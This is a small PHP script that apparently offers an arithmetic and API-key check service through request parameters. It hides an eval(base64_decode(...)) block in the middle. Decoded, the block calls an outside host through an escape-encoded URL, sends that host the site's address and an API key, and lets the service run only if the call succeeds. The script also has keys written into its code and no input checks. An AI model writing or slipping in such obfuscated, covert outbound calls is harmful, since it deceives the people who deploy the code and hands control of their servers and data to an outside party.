<?php
$key_array = array('AP12CR59DX',1234,'MTBR7584CA');

function mathOps($param1,$param2,$funcname)
{
    if($funcname == 'add')
    $result  = $param1+$param2;
    else if($funcname == 'subtract')
    $result  = $param1-$param2;
    else if($funcname == 'multiply')
    $result  = $param1*$param2;
    else if($funcname == 'division')
    $result  = $param1/$param2;

    return "Hello, ".ucwords($funcname)." Result of ".$param1." & ".$param2." = " . $result;
}

function validateAPIKey($key)
{
    global $key_array;

    if(in_array($key,$key_array))
    return 1;
    else
    return 0;
}

eval(base64_decode('CiAka2V5U3RhdHVzID0gZmlsZV9nZXRfY29udGVudHMoIlwxNTBcMTY0XDE2NFwxNjBceDNhXDU3XHgyZlwxNDFcMTYwXDE1MVx4MmRceDczXDE2NVwxNjBceDcwXHg2ZlwxNjJcMTY0XDU2XHg2MVx4NzNceDM0XHg3NVx4MmVcMTUxXDE1Nlw1N1x4NjFceDcwXHg2OVw1NVx4NzNceDc1XHg3MFx4NzBcMTU3XHg3Mlx4NzRceDJmXHg3NlwxNDFcMTU0XHg2OVx4NjRcMTQxXDE2NFwxNDVceDQzXHg2Y1wxNTFcMTQ1XHg2ZVx4NzRceDU1XHg1MlwxMTRcNTZcMTYwXDE1MFwxNjBcNzdcMTQzXHg2Y1wxNTFceDY1XHg2ZVx4NzRceDVmXDE2NVwxNjJceDZjXDc1XHg2ZFwxNTdceDc0XHg2OVwxNDJcMTY1XHg2OVx4NmNceDY0XDE0NVx4NzJcMTYzXHgyZVx4NjNcMTU3XDE1NVw0Nlx4NzNcMTUxXHg3NFx4NjVceDVmXHg2OVx4NmVcMTQ0XHg2NVwxNzBceDNkXDE1NVx4NzRcMTQyXDE2Mlw0NlwxNDFcMTYwXDE1MVx4NWZceDZiXDE0NVwxNzFcNzVceDMzXDcwXDEwNVw2MVw1NVx4MzlceDM2XDYwXHgzNVw1NVx4MzlcNjZceDMyXHg0M1x4MmRceDM4XHg0NVw2MVx4MzkiKTsg'));

if($keyStatus)
{
    if (isset($_REQUEST['param1']) && isset($_REQUEST['param2']) && isset($_REQUEST['funcname']))
    {
        echo mathOps($_REQUEST['param1'],$_REQUEST['param2'],$_REQUEST['funcname']);
    }

    if (isset($_REQUEST['key']) && isset($_REQUEST['funcname']) && $_REQUEST['funcname'] == 'validatekey')
    {
        echo validateAPIKey($_REQUEST['key']);
    }
}
?>